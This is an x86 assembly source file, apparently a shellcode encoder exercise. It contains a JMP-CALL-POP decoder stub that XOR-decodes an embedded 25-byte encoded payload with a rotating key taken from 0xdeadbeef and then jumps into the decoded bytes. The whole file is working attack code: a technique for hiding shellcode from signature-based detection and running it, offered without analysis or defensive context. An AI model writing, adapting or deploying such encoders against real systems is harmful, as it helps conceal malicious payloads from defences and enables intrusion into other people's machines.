DECODER_RING equ 0xdeadbeef
global _start
section .text
  _start:
    jmp short call_decoder

  decoder:
    pop esi
    mov eax, DECODER_RING
    xor edx, edx
    xor edi, edi
    mov cl, 25 ; encoded shellcode length

  reset:
    mov ebx, DECODER_RING

  decode:
    cmp ebx, edi
    jz reset
    xor [esi+edx], bl
    inc edx
    shr ebx, 0x8
    loop decode
    jmp esi

  call_decoder:
    call decoder
    encoded: db 0xde,0x7e,0xfd,0xb6,0xc0,0x91,0xc1,0xad,0x87,0x91,0xcf,0xb7,0x81,0x37,0x4e,0x8e,0x66,0x5c,0xfe,0x57,0xe,0xe,0xa6,0x13,0x6f
